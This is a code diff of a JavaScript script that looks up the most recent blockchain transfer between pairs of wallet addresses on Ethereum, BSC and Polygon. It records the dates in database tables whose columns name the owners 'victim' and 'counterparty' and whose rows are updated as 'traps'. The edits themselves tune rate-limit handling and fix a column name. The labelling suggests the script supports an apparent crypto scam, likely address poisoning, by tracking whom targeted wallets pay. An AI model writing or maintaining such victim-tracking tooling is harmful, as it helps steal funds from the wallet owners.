@@ -142,14 +142,11 @@ async function fetchLastTransfer(client, fromAddress, toAddress, chainName) {
       const timestamp = new Date(transfer.metadata?.blockTimestamp).toISOString();
 
       let amount = '0';
-      let asset = 'ETH';
+      let asset = chainName === 'ethereum' ? 'ETH' : chainName === 'bsc' ? 'BNB' : 'MATIC';
 
       if (transfer.category === 'external') {
-        // Native transfer
         amount = transfer.value?.toString() || '0';
-        asset = chainName === 'ethereum' ? 'ETH' : chainName === 'bsc' ? 'BNB' : 'MATIC';
       } else if (transfer.category === 'erc20') {
-        // ERC-20 transfer
         amount = transfer.rawContract?.value || '0';
         asset = transfer.asset || 'UNKNOWN';
       }
@@ -165,25 +162,34 @@ async function fetchLastTransfer(client, fromAddress, toAddress, chainName) {
 
     return { success: true, no_transfer: true };
   } catch (error) {
-    const errMsg = error.message || String(error);
+    const errMsg = (error.message || String(error)).toLowerCase();
+    const errShort = error.shortMessage?.toLowerCase() || '';
+    const errDetails = error.details?.toLowerCase() || '';
+    const combined = errMsg + ' ' + errShort + ' ' + errDetails;
 
-    // Check for rate limit
-    if (errMsg.includes('429') || errMsg.includes('rate limit') || errMsg.includes('Too Many Requests')) {
+    // 🆕 Catch ALL rate limit variants including 'rate-limit-fipt'
+    const isRateLimit = combined.includes('429') ||
+      combined.includes('rate limit') ||
+      combined.includes('too many requests') ||
+      combined.includes('rate-limit') ||
+      combined.includes('fipt');
+
+    if (isRateLimit) {
       rateLimitCount++;
       lastRateLimitTime = Date.now();
 
       if (rateLimitCount >= 5) {
-        console.warn(`[Rate Limit] Hit ${rateLimitCount} rate limits, pausing 60s...`);
+        console.warn(`\n[Rate Limit] Hit ${rateLimitCount} rate limits, pausing 60s...`);
         await new Promise(res => setTimeout(res, 60000));
         rateLimitCount = 0;
       } else {
         const waitTime = Math.min(2 ** rateLimitCount, 30) * 1000;
-        console.warn(`[Rate Limit] ${rateLimitCount}, waiting ${waitTime / 1000}s...`);
+        console.warn(`\n[Rate Limit] #${rateLimitCount}, waiting ${waitTime / 1000}s...`);
         await new Promise(res => setTimeout(res, waitTime));
       }
     }
 
-    return { success: false, error: errMsg };
+    return { success: false, error: errMsg.slice(0, 150) };
   }
 }
 
@@ -236,14 +242,16 @@ async function processTable(tableName, chainId, chainName, client) {
   // Determine correct column names based on table
   const fromCol = tableName === 'pending_targets' ? 'victim' : 'victim_address';
   const toCol = tableName === 'pending_targets' ? 'counterparty' : 'counterparty_address';
-  const chainCol = tableName === 'pending_targets' ? 'chain' : 'chain_id';
+
+  // 🆕 FIX: Both tables use 'chain' (text name like 'ethereum'), not chain_id
+  const chainCol = 'chain';
+  const chainValue = chainName;  // 'ethereum', 'bsc', 'polygon'
 
   while (true) {
-    // Fetch records without last_transfer_date
     const { data: records, error } = await supabaseAdmin
       .from(tableName)
       .select(`id, ${fromCol}, ${toCol}`)
-      .eq(chainCol, chainName)
+      .eq(chainCol, chainValue)
       .is('last_transfer_date', null)
       .limit(PAGE_SIZE);
 
@@ -259,7 +267,6 @@ async function processTable(tableName, chainId, chainName, client) {
 
     console.log(`\n[Page] Processing ${records.length} ${tableName} records...`);
 
-    // Process in chunks
     const chunks = chunkArray(records, RPC_CONCURRENCY);
 
     for (let i = 0; i < chunks.length; i++) {
@@ -279,14 +286,12 @@ async function processTable(tableName, chainId, chainName, client) {
         })
       );
 
-      // Update database
       for (const { record, result } of results) {
         totalProcessed++;
 
         if (result.success) {
           if (result.no_transfer) {
             totalNoTransfer++;
-            // Mark as processed even if no transfer found
             await (tableName === 'pending_targets'
               ? updatePendingTarget(record.id, { last_transfer_date: '1970-01-01T00:00:00.000Z' })
               : updateTrap(record.id, { last_transfer_date: '1970-01-01T00:00:00.000Z' }));
@@ -303,19 +308,19 @@ async function processTable(tableName, chainId, chainName, client) {
               ? await updatePendingTarget(record.id, updateData)
               : await updateTrap(record.id, updateData);
 
-            if (!success) {
-              totalErrors++;
-            }
+            if (!success) totalErrors++;
           }
         } else {
           totalErrors++;
-          console.warn(`[Error] Failed to fetch transfer for ${record.id}: ${result.error}`);
+          // Only log first 5 errors per page to reduce noise
+          if (totalErrors <= 5) {
+            console.warn(`[Error] Failed for ${record.id}: ${result.error}`);
+          }
         }
       }
 
       process.stdout.write(`  Progress: ${Math.min((i + 1) * RPC_CONCURRENCY, records.length)}/${records.length} | Updated: ${totalUpdated} | No Transfer: ${totalNoTransfer} | Errors: ${totalErrors}\r`);
 
-      // Pacing pause
       if (i < chunks.length - 1) {
         await new Promise(res => setTimeout(res, RATE_LIMIT_DELAY));
       }
